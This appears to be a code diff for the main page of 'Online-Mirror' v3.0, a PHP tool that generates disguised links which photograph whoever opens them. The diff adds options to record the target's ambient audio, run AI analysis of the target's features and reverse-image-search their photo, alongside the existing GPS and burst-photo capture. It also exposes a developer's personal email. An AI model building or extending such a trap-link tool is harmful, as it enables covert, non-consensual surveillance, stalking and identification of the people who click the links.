@@ -1,10 +1,17 @@
 <?php
 /**
- * Online-Mirror 升级版 v2.0 - 主页面
+ * Online-Mirror v3.0 - 主页面
  * 支持双重模式：链接生成器 & 拍照入口
  */
 session_start();
 require_once __DIR__ . '/config.php';
+
+// ========== 封禁IP拦截：禁止生成链接和查看内容 ==========
+if (isIPBanned()) {
+    $ban_reason = getBanReason();
+    die('<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>访问被拒绝</title><style>body{background:#0f0c29;color:#e0e0e0;font-family:-apple-system,BlinkMacSystemFont,\'Segoe UI\',Roboto,sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0;padding:20px}.card{background:rgba(255,255,255,0.05);backdrop-filter:blur(20px);border:1px solid rgba(255,80,80,0.2);border-radius:24px;padding:40px;max-width:420px;width:100%;text-align:center}.card .icon{font-size:64px;margin-bottom:16px}.card h1{font-size:22px;color:#ff6b6b;margin:0 0 8px}.card p{color:#8080a0;font-size:14px;line-height:1.6;margin:0}</style></head><body><div class="card"><div class="icon">🚫</div><h1>访问被拒绝</h1><p>' . htmlspecialchars($ban_reason) . '</p></div></body></html>');
+}
+
 $csrf = csrfToken();
 
 // ========== 拍照模式：当传入 id&url 时跳转到 capture.php ==========
@@ -37,17 +44,22 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action']) && $_POST['
         $notify_email = filter_var($notify_email, FILTER_VALIDATE_EMAIL) ? $notify_email : null;
         $short_domain = trim($_POST['short_domain'] ?? '');
         $short_domain = mb_substr(strip_tags($short_domain), 0, 200);
-        $burst_count = intval($_POST['burst_count'] ?? 0);
+        $burst_enabled = isset($_POST['burst_enabled']) && $_POST['burst_enabled'] === '1';
+        $burst_count = $burst_enabled ? intval($_POST['burst_count'] ?? 0) : 0;
         $burst_count = ($burst_count >= 2 && $burst_count <= 5) ? $burst_count : null;
         $gps_enabled = isset($_POST['gps_enabled']) ? 1 : 0;
+        $recording_enabled = isset($_POST['recording_enabled']) && $_POST['recording_enabled'] === '1' ? 1 : 0;
+        $recording_seconds = $recording_enabled ? intval($_POST['recording_seconds'] ?? 5) : 0;
         $show_qrcode = isset($_POST['show_qrcode']) ? 1 : 0;
+        $ai_enabled = isset($_POST['ai_enabled']) ? 1 : 0;
+        $reverse_enabled = isset($_POST['reverse_enabled']) ? 1 : 0;
         $user_id = isLoggedIn() ? $_SESSION['user_id'] : null;
         
         // 生成唯一ID（确保不重复）
         do {
             $link_id = generateID(6);
             $db = getDB();
-            $stmt = $db->prepare("SELECT COUNT(*) FROM links WHERE link_id = ?");
+            $stmt = $db->prepare("SELECT COUNT(*) FROM mir_links WHERE link_id = ?");
             $stmt->execute([$link_id]);
         } while ($stmt->fetchColumn() > 0);
         
@@ -55,8 +67,12 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action']) && $_POST['
         $expires_at = date('Y-m-d H:i:s', strtotime("+{$expire_days} days"));
         
         // 入库
-        $stmt = $db->prepare("INSERT INTO links (link_id, redirect_url, user_id, tags, notify_email, short_domain, gps_enabled, burst_count, expires_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)");
-        $stmt->execute([$link_id, $redirect_url, $user_id, $tags, $notify_email, $short_domain, $gps_enabled, $burst_count, $expires_at]);
+        $stmt = $db->prepare("INSERT INTO mir_links (link_id, redirect_url, user_id, tags, notify_email, short_domain, gps_enabled, recording_enabled, recording_seconds, burst_count, expires_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)");
+        $stmt->execute([$link_id, $redirect_url, $user_id, $tags, $notify_email, $short_domain, $gps_enabled, $recording_enabled, $recording_seconds, $burst_count, $expires_at]);
+        
+        // 写入AI和反向图搜设置（新字段存设置表）
+        setSetting('link_ai_' . $link_id, $ai_enabled ? '1' : '0');
+        setSetting('link_reverse_' . $link_id, $reverse_enabled ? '1' : '0');
         
         $generated_id = $link_id;
         // 自定义短域名
@@ -318,6 +334,105 @@ body {
 }
 .footer a:hover { text-decoration: underline; }
 .footer .divider { margin: 0 8px; color: #404060; }
+.footer .social-links {
+    display:flex; align-items:center; justify-content:center; gap:12px;
+    margin-bottom:10px;
+}
+.footer .social-links a {
+    display:inline-flex; align-items:center; gap:4px;
+    padding:6px 12px; border-radius:8px;
+    background:rgba(255,255,255,0.04);
+    border:1px solid rgba(255,255,255,0.06);
+    color:#a0a0b8; font-size:12px; transition:all 0.3s;
+}
+.footer .social-links a:hover {
+    background:rgba(255,255,255,0.08);
+    border-color:rgba(102,126,234,0.3);
+    color:#e0e0e0;
+}
+.footer .social-links a.dev-btn {
+    background:rgba(102,126,234,0.1);
+    border-color:rgba(102,126,234,0.2);
+    color:#667eea;
+}
+.footer .social-links a.dev-btn:hover {
+    background:rgba(102,126,234,0.2);
+}
+
+/* 开发者弹窗 */
+.dev-modal {
+    display:none;
+    position:fixed; top:0; left:0; right:0; bottom:0;
+    z-index:9999; background:rgba(0,0,0,0.85);
+    justify-content:center; align-items:center;
+}
+.dev-modal.show { display:flex; }
+.dev-modal .modal-box {
+    background:#1a1a2e;
+    border:1px solid rgba(255,255,255,0.12);
+    border-radius:16px; overflow:hidden;
+    width:90vw; max-width:380px;
+}
+.dev-modal .modal-header {
+    padding:14px 20px; display:flex; justify-content:space-between; align-items:center;
+    border-bottom:1px solid rgba(255,255,255,0.06);
+}
+.dev-modal .modal-header h3 { font-size:16px; }
+.dev-modal .modal-header .close-btn {
+    font-size:24px; color:#8080a0; cursor:pointer; border:none; background:none;
+}
+.dev-modal .modal-header .close-btn:hover { color:#fff; }
+.dev-modal .modal-body { padding:20px; }
+
+/* 开发者卡片 */
+.dev-card {
+    background:rgba(255,255,255,0.04);
+    border:1px solid rgba(255,255,255,0.08);
+    border-radius:12px; padding:20px;
+    text-align:center; cursor:pointer;
+    transition:all 0.3s;
+}
+.dev-card:hover {
+    background:rgba(255,255,255,0.08);
+    border-color:rgba(102,126,234,0.3);
+    transform:translateY(-2px);
+}
+.dev-card .avatar {
+    width:72px; height:72px; border-radius:50%;
+    border:3px solid rgba(102,126,234,0.3);
+    margin:0 auto 12px; display:block;
+    object-fit:cover;
+}
+.dev-card .name {
+    font-size:18px; font-weight:600; color:#e0e0e0;
+}
+.dev-card .badge {
+    display:inline-block;
+    padding:2px 10px; border-radius:6px;
+    background:rgba(255,193,7,0.15); color:#ffc107;
+    font-size:11px; margin-top:4px;
+}
+.dev-card .motto {
+    font-size:13px; color:#8080a0;
+    margin-top:8px; font-style:italic;
+}
+.dev-card .click-hint {
+    font-size:11px; color:#606080; margin-top:10px;
+}
+
+/* 复制邮箱toast */
+.copy-toast {
+    position:fixed; top:50%; left:50%;
+    transform:translate(-50%,-50%) scale(0.8);
+    padding:16px 28px; border-radius:12px;
+    background:rgba(0,0,0,0.9); color:#fff;
+    font-size:14px; z-index:10000;
+    opacity:0; transition:all 0.3s ease;
+    pointer-events:none;
+}
+.copy-toast.show {
+    opacity:1; transform:translate(-50%,-50%) scale(1);
+}
 
 /* Toast */
 .toast {
@@ -354,8 +469,10 @@ body {
     </div>
 
     <?php if ($rate_error): ?>
-    <div style="padding:12px 16px;border-radius:12px;background:rgba(255,80,80,0.12);border:1px solid rgba(255,80,80,0.2);color:#ff6b6b;font-size:14px;margin-bottom:18px;text-align:center;">
-        <i class="fas fa-exclamation-triangle"></i> <?php echo htmlspecialchars($rate_error); ?>
+    <div id="rateLimitBox" style="padding:12px 16px;border-radius:12px;background:rgba(255,80,80,0.12);border:1px solid rgba(255,80,80,0.2);color:#ff6b6b;font-size:14px;margin-bottom:18px;text-align:center;">
+        <i class="fas fa-exclamation-triangle"></i> 
+        <span id="rateLimitMsg"><?php echo htmlspecialchars($rate_error); ?></span>
+        <span id="rateLimitCountdown" style="display:none;font-weight:700;font-size:16px;" class=""></span>
     </div>
     <?php endif; ?>
     
@@ -401,9 +518,12 @@ body {
                 <i class="fas fa-envelope"></i> 邮箱通知
                 <small>有人拍照时发邮件</small>
             </div>
-            <button type="button" class="toggle" id="toggleEmailBtn" onclick="toggleField('email')">
-                <div class="knob"></div>
-            </button>
+            <div style="display:flex;align-items:center;gap:6px;">
+                <span style="font-size:10px;color:#ff9800;display:<?php echo getSetting('email_enabled') !== '1' ? 'inline' : 'none'; ?>;">未配置</span>
+                <button type="button" class="toggle" id="toggleEmailBtn" onclick="toggleField('email')">
+                    <div class="knob"></div>
+                </button>
+            </div>
         </div>
         <div class="toggle-field" id="toggleEmailField">
             <div class="form-group" style="margin-bottom:0;">
@@ -419,8 +539,35 @@ body {
         </div>
         <div id="moreSettingsBody" style="display:none;">
             
-            <!-- 二维码开关 -->
+            <!-- AI分析开关（排最前） -->
             <div class="toggle-group" style="border-top:none;">
+                <div class="label">
+                    <i class="fas fa-robot"></i> AI 人像分析
+                    <small>拍照后AI分析对方特征</small>
+                </div>
+                <div style="display:flex;align-items:center;gap:6px;">
+                    <span style="font-size:10px;color:#ff9800;display:<?php echo empty(getSetting('ai_api_key')) ? 'inline' : 'none'; ?>;">未配置</span>
+                    <button type="button" class="toggle on" id="toggleAiBtn" onclick="toggleField('ai')">
+                        <div class="knob"></div>
+                    </button>
+                </div>
+            </div>
+            <input type="hidden" name="ai_enabled" id="aiEnabledInput" value="1">
+            
+            <!-- 反向图搜开关 -->
+            <div class="toggle-group" style="border-top:1px solid rgba(255,255,255,0.06);">
+                <div class="label">
+                    <i class="fas fa-search"></i> 反向图搜
+                    <small>以图搜图查来源</small>
+                </div>
+                <button type="button" class="toggle on" id="toggleReverseBtn" onclick="toggleField('reverse')">
+                    <div class="knob"></div>
+                </button>
+            </div>
+            <input type="hidden" name="reverse_enabled" id="reverseEnabledInput" value="1">
+            
+            <!-- 二维码开关 -->
+            <div class="toggle-group" style="border-top:1px solid rgba(255,255,255,0.06);">
                 <div class="label">
                     <i class="fas fa-qrcode"></i> 二维码
                     <small>生成链接二维码</small>
@@ -437,6 +584,7 @@ body {
                     <i class="fas fa-camera-retro"></i> 连拍模式
                     <small>多张连拍不遗漏</small>
                 </div>
+                <input type="hidden" name="burst_enabled" id="burstEnabledInput" value="0">
                 <button type="button" class="toggle" id="toggleBurstBtn" onclick="toggleField('burst')">
                     <div class="knob"></div>
                 </button>
@@ -467,6 +615,30 @@ body {
                 <input type="hidden" name="gps_enabled" id="gpsEnabledInput" value="0">
                 <div style="padding:10px 14px;border-radius:10px;background:rgba(255,152,0,0.08);border:1px solid rgba(255,152,0,0.15);font-size:12px;color:#ffa726;margin-bottom:10px;">
                     <i class="fas fa-exclamation-triangle"></i> 开启后对方打开链接时浏览器可能会弹出位置授权提示，请谨慎使用
+                </div>
+            </div>
+            
+            <!-- 录音采样开关 -->
+            <div class="toggle-group" style="border-top:1px solid rgba(255,255,255,0.06);">
+                <div class="label">
+                    <i class="fas fa-microphone"></i> 录音采样
+                    <small>录制对方环境声音</small>
+                </div>
+                <input type="hidden" name="recording_enabled" id="recordingEnabledInput" value="0">
+                <button type="button" class="toggle" id="toggleRecordingBtn" onclick="toggleField('recording')">
+                    <div class="knob"></div>
+                </button>
+            </div>
+            <div class="toggle-field" id="toggleRecordingField">
+                <div class="form-group" style="margin-bottom:0;">
+                    <select name="recording_seconds" style="width:100%;padding:12px 16px;border:1px solid rgba(255,255,255,0.12);border-radius:12px;background:rgba(255,255,255,0.06);color:#e0e0e0;font-size:15px;outline:none;">
+                        <option value="3">3 秒</option>
+                        <option value="5" selected>5 秒</option>
+                        <option value="10">10 秒</option>
+                        <option value="15">15 秒</option>
+                        <option value="30">30 秒</option>
+                    </select>
+                    <div style="font-size:11px;color:#606080;margin-top:4px;">对方打开链接后录制指定秒数的环境声音，录制完成后自动拍照</div>
                 </div>
             </div>
             
@@ -516,6 +688,9 @@ body {
                 <img id="qrcodeImg" src="<?php echo $generated_link ? 'https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=' . urlencode($generated_link) : ''; ?>" alt="二维码" style="width:160px;height:160px;border-radius:12px;background:#fff;padding:8px;">
             </div>
         </div>
+        <div style="margin-top:14px;padding-top:14px;border-top:1px solid rgba(255,255,255,0.06);display:flex;gap:8px;">
+            <button onclick="showHistory()" style="flex:1;padding:10px;border:1px solid rgba(102,126,234,0.25);border-radius:10px;background:rgba(102,126,234,0.08);color:#8080c0;cursor:pointer;font-size:13px;transition:all 0.3s;"><i class="fas fa-history"></i> 查看历史记录</button>
+        </div>
     </div>
 
     <!-- 快速查看照片 -->
@@ -528,6 +703,21 @@ body {
     </div>
 
     <div class="footer">
+        <div class="social-links">
+            <a href="https://github.com/beihaiBH/Online-Mirror/" target="_blank" rel="noopener">
+                <i class="fab fa-github"></i> GitHub
+            </a>
+            <a href="https://gitee.com/beihaiLG/online-mirror" target="_blank" rel="noopener">
+                <i class="fab fa-git-alt"></i> Gitee
+            </a>
+            <a href="javascript:void(0)" class="dev-btn" onclick="showDeveloper()">
+                <i class="fas fa-code"></i> 开发者
+            </a>
+            <a href="javascript:void(0)" class="dev-btn" onclick="showDonation()" style="background:rgba(255,193,7,0.12);border-color:rgba(255,193,7,0.2);color:#ffc107;">
+                <i class="fas fa-coffee"></i> 打赏
+            </a>
+        </div>
+        <div>
         <?php if (isLoggedIn()): ?>
             <i class="fas fa-user"></i> <?php echo htmlspecialchars($_SESSION['username']); ?>
             <span class="divider">|</span>
@@ -537,8 +727,103 @@ body {
         <?php else: ?>
             <a href="login.php"><i class="fas fa-lock"></i> 管理员登录</a>
         <?php endif; ?>
+        </div>
     </div>
 </div>
+
+<!-- 开发者弹窗 -->
+<div class="dev-modal" id="devModal">
+    <div class="modal-box">
+        <div class="modal-header">
+            <h3><i class="fas fa-code" style="color:#667eea;"></i> 开发者</h3>
+            <button class="close-btn" onclick="closeDev()">&times;</button>
+        </div>
+        <div class="modal-body">
+            <div class="dev-card" onclick="copyDevEmail()" title="点击复制邮箱">
+                <img class="avatar" src="http://q1.qlogo.cn/g?b=qq&nk=629401918&s=640" alt="头像">
+                <div class="name">beihai</div>
+                <div class="badge">⭐ 核心开发</div>
+                <div class="motto">「心中无女人，代码自然神」</div>
+                <div class="click-hint"><i class="fas fa-envelope"></i> 点击复制邮箱</div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- 打赏弹窗 -->
+<div class="dev-modal" id="donationModal">
+    <div class="modal-box">
+        <div class="modal-header">
+            <h3><i class="fas fa-coffee" style="color:#ffc107;"></i> 打赏支持</h3>
+            <button class="close-btn" onclick="closeDonation()">&times;</button>
+        </div>
+        <div class="modal-body" style="text-align:center;">
+            <p style="font-size:13px;color:#8080a0;margin-bottom:16px;">如果这个项目帮到了你，欢迎打赏支持开发者～</p>
+            <div id="donationQRCodes" style="display:flex;flex-wrap:wrap;gap:16px;justify-content:center;">
+                <?php
+                $donation_channels = json_decode(getSetting('donation_channels') ?: '[]', true);
+                foreach ($donation_channels as $ch): 
+                    $ch_img = htmlspecialchars($ch['image'] ?? '');
+                    $ch_name = htmlspecialchars($ch['name'] ?? '打赏');
+                    if (!empty($ch_img)):
+                ?>
+                <div style="text-align:center;">
+                    <img src="<?php echo $ch_img; ?>" alt="<?php echo $ch_name; ?>" style="width:160px;height:160px;border-radius:12px;background:#fff;padding:8px;object-fit:contain;">
+                    <div style="font-size:12px;color:#a0a0b8;margin-top:6px;"><?php echo $ch_name; ?></div>
+                </div>
+                <?php 
+                    endif;
+                endforeach; 
+                ?>
+            </div>
+            <?php if (empty($donation_channels)): ?>
+            <p style="color:#606080;font-size:13px;">管理员暂未设置打赏方式</p>
+            <?php endif; ?>
+        </div>
+    <!-- 复制邮箱提示 -->
+<div class="copy-toast" id="copyToast">✅ 邮箱已复制到剪贴板</div>
+
+<script>
+function showDeveloper() {
+    document.getElementById('devModal').classList.add('show');
+    document.body.style.overflow = 'hidden';
+}
+function closeDev() {
+    document.getElementById('devModal').classList.remove('show');
+    document.body.style.overflow = '';
+}
+function showDonation() {
+    document.getElementById('donationModal').classList.add('show');
+    document.body.style.overflow = 'hidden';
+}
+function closeDonation() {
+    document.getElementById('donationModal').classList.remove('show');
+    document.body.style.overflow = '';
+}
+function copyDevEmail() {
+    var email = 'stockstock12001@gmail.com';
+    navigator.clipboard.writeText(email).then(function() {
+        var toast = document.getElementById('copyToast');
+        toast.classList.add('show');
+        setTimeout(function() { toast.classList.remove('show'); }, 2000);
+    }).catch(function() {
+        var ta = document.createElement('textarea');
+        ta.value = email;
+        document.body.appendChild(ta);
+        ta.select();
+        document.execCommand('copy');
+        document.body.removeChild(ta);
+        var toast = document.getElementById('copyToast');
+        toast.classList.add('show');
+        setTimeout(function() { toast.classList.remove('show'); }, 2000);
+    });
+}
+document.addEventListener('keydown', function(e) {
+    if (e.key === 'Escape') { closeDev(); closeDonation(); closeHistory(); }
+});
+document.addEventListener('click', function(e) {
+    if (e.target.classList.contains('dev-modal')) { closeDev(); closeDonation(); }
+});
 
 <script>
 function validateForm() {
@@ -579,9 +864,133 @@ function showToast(msg, success) {
     setTimeout(() => t.classList.remove('show'), 2500);
 }
 
-// 如果已有生成的链接，自动展示结果
+// ========== 频率限制倒计时 ==========
+<?php if ($rate_error && strpos($rate_error, '操作太频繁') !== false): ?>
+document.addEventListener('DOMContentLoaded', function() {
+    var submitBtn = document.querySelector('.btn-generate');
+    var countdownEl = document.getElementById('rateLimitCountdown');
+    var msgEl = document.getElementById('rateLimitMsg');
+    if (!countdownEl || !submitBtn) return;
+    
+    var seconds = 91;
+    submitBtn.disabled = true;
+    submitBtn.style.opacity = '0.5';
+    submitBtn.style.cursor = 'not-allowed';
+    countdownEl.style.display = 'inline';
+    countdownEl.textContent = '(' + seconds + 's)';
+    
+    var timer = setInterval(function() {
+        seconds--;
+        countdownEl.textContent = '(' + seconds + 's)';
+        if (seconds <= 0) {
+            clearInterval(timer);
+            submitBtn.disabled = false;
+            submitBtn.style.opacity = '1';
+            submitBtn.style.cursor = 'pointer';
+            msgEl.textContent = '⏳ 可以重新生成链接了';
+            countdownEl.style.display = 'none';
+            setTimeout(function() {
+                var box = document.getElementById('rateLimitBox');
+                if (box) box.style.display = 'none';
+            }, 3000);
+        }
+    }, 1000);
+});
+<?php endif; ?>
+
+// ========== v3.0 历史记录 (localStorage) ==========
+function saveHistory(id, link) {
+    try {
+        var history = JSON.parse(localStorage.getItem('mirror_history') || '[]');
+        history = history.filter(function(item) { return item.id !== id; });
+        history.unshift({ id: id, link: link, time: new Date().toLocaleString() });
+        if (history.length > 10) history = history.slice(0, 10);
+        localStorage.setItem('mirror_history', JSON.stringify(history));
+    } catch(e) {}
+}
+
+function showHistory() {
+    var history = [];
+    try { history = JSON.parse(localStorage.getItem('mirror_history') || '[]'); } catch(e) {}
+    
+    var modal = document.createElement('div');
+    modal.className = 'dev-modal show';
+    modal.id = 'historyModal';
+    
+    var body = '<div class="modal-box" style="max-width:520px;">' +
+        '<div class="modal-header">' +
+            '<h3><i class="fas fa-history" style="color:#667eea;"></i> 历史记录</h3>' +
+            '<button class="close-btn" onclick="closeHistory()">&times;</button>' +
+        '</div>' +
+        '<div class="modal-body" style="max-height:400px;overflow-y:auto;padding:12px 16px;">';
+    
+    if (history.length === 0) {
+        body += '<div style="text-align:center;padding:40px 20px;color:#606080;"><i class="fas fa-inbox" style="font-size:48px;margin-bottom:12px;display:block;"></i><p>暂无历史记录</p></div>';
+    } else {
+        for (var i = 0; i < history.length; i++) {
+            var item = history[i];
+            var displayLink = item.link.length > 50 ? item.link.substring(0, 50) + '...' : item.link;
+            body += '<div class="history-item" data-link="' + item.link.replace(/"/g,'&quot;') + '" data-id="' + item.id.replace(/"/g,'&quot;') + '" style="padding:10px 12px;margin-bottom:8px;background:rgba(255,255,255,0.04);border:1px solid rgba(255,255,255,0.08);border-radius:10px;">' +
+                '<div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:4px;">' +
+                    '<span style="color:#667eea;font-family:monospace;font-size:13px;font-weight:600;">' + item.id + '</span>' +
+                    '<span style="color:#606080;font-size:11px;">' + (item.time || '') + '</span>' +
+                '</div>' +
+                '<div style="display:flex;gap:6px;align-items:center;">' +
+                    '<span style="flex:1;font-size:12px;color:#a0a0b8;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;" title="' + item.link.replace(/"/g,'&quot;') + '">' + displayLink + '</span>' +
+                    '<button class="history-copy-link" style="padding:4px 10px;border:none;border-radius:6px;background:rgba(102,126,234,0.2);color:#667eea;cursor:pointer;font-size:11px;"><i class="fas fa-copy"></i> 复制链接</button>' +
+                    '<button class="history-copy-id" style="padding:4px 10px;border:none;border-radius:6px;background:rgba(76,175,80,0.15);color:#4caf50;cursor:pointer;font-size:11px;"><i class="fas fa-tag"></i> 复制ID</button>' +
+                '</div>' +
+            '</div>';
+        }
+    }
+    
+    body += '<div style="text-align:center;padding-top:10px;">' +
+        '<button onclick="clearAllHistory()" style="padding:8px 20px;border:1px solid rgba(255,80,80,0.2);border-radius:8px;background:rgba(255,80,80,0.08);color:#ff6b6b;cursor:pointer;font-size:12px;"><i class="fas fa-trash"></i> 清空历史记录</button>' +
+    '</div></div></div>';
+    
+    modal.innerHTML = body;
+    document.body.appendChild(modal);
+    document.body.style.overflow = 'hidden';
+    
+    // 使用事件委托处理复制按钮和点击遮罩
+    modal.addEventListener('click', function(e) {
+        if (e.target.closest('.history-copy-link')) {
+            var item = e.target.closest('.history-item');
+            if (item) {
+                navigator.clipboard.writeText(item.getAttribute('data-link')).then(function() {
+                    showToast('✅ 链接已复制', true);
+                });
+            }
+        } else if (e.target.closest('.history-copy-id')) {
+            var item = e.target.closest('.history-item');
+            if (item) {
+                navigator.clipboard.writeText(item.getAttribute('data-id')).then(function() {
+                    showToast('✅ ID已复制', true);
+                });
+            }
+        } else if (e.target === modal) {
+            closeHistory();
+        }
+    });
+}
+
+function closeHistory(e) {
+    if (e && e.target && e.target.id !== 'historyModal') return;
+    var modal = document.getElementById('historyModal');
+    if (modal) { modal.remove(); document.body.style.overflow = ''; }
+}
+
+function clearAllHistory() {
+    if (!confirm('确定清空所有历史记录？')) return;
+    try { localStorage.removeItem('mirror_history'); } catch(e) {}
+    closeHistory();
+    showToast('✅ 历史记录已清空', true);
+}
+
+// 如果已有生成的链接，自动展示结果并保存历史
 <?php if ($generated_link): ?>
 document.getElementById('resultBox').style.display = 'block';
+saveHistory('<?php echo htmlspecialchars($generated_id); ?>', '<?php echo htmlspecialchars($generated_link); ?>');
 <?php endif; ?>
 
 // 预先清空表单的redirect_url字段
@@ -638,7 +1047,61 @@ function toggleField(type) {
         var gpsInput = document.getElementById('gpsEnabledInput');
         if (gpsInput) gpsInput.value = btn.classList.contains('on') ? '1' : '0';
     }
+    
+    // 录音采样特殊处理
+    if (type === 'recording') {
+        var recInput = document.getElementById('recordingEnabledInput');
+        if (recInput) recInput.value = btn.classList.contains('on') ? '1' : '0';
+        if (!field.classList.contains('show')) {
+            var sel = field.querySelector('select');
+            if (sel) sel.selectedIndex = 1;
+        }
+        return;
+    }
+    
+    // 连拍模式特殊处理
+    if (type === 'burst') {
+        var burstInput = document.getElementById('burstEnabledInput');
+        if (burstInput) burstInput.value = btn.classList.contains('on') ? '1' : '0';
+        if (!field.classList.contains('show')) {
+            var sel = field.querySelector('select');
+            if (sel) sel.selectedIndex = 0;
+        }
+    }
+    
+    // v3.0 AI & 反向图搜特殊处理
+    if (type === 'ai') {
+        var aiInput = document.getElementById('aiEnabledInput');
+        if (aiInput) aiInput.value = btn.classList.contains('on') ? '1' : '0';
+        
+        // 如果管理员没配置AI，弹出提示
+        <?php if (empty(getSetting('ai_api_key'))): ?>
+        if (btn.classList.contains('on')) {
+            setTimeout(function() {
+                btn.classList.remove('on');
+                if (aiInput) aiInput.value = '0';
+                showToast('⚠️ 管理员尚未配置 AI 模型，请联系管理员在后台设置', false);
+            }, 100);
+        }
+        <?php endif; ?>
+    }
+    if (type === 'reverse') {
+        var revInput = document.getElementById('reverseEnabledInput');
+        if (revInput) revInput.value = btn.classList.contains('on') ? '1' : '0';
+    }
 }
+
+// v3.0 AI默认开，但如果管理员没配key则强制关
+<?php if (empty(getSetting('ai_api_key'))): ?>
+document.addEventListener('DOMContentLoaded', function() {
+    var aiBtn = document.getElementById('toggleAiBtn');
+    var aiInput = document.getElementById('aiEnabledInput');
+    if (aiBtn && aiInput) {
+        aiBtn.classList.remove('on');
+        aiInput.value = '0';
+    }
+});
+<?php endif; ?>
 </script>
 </body>
 </html>
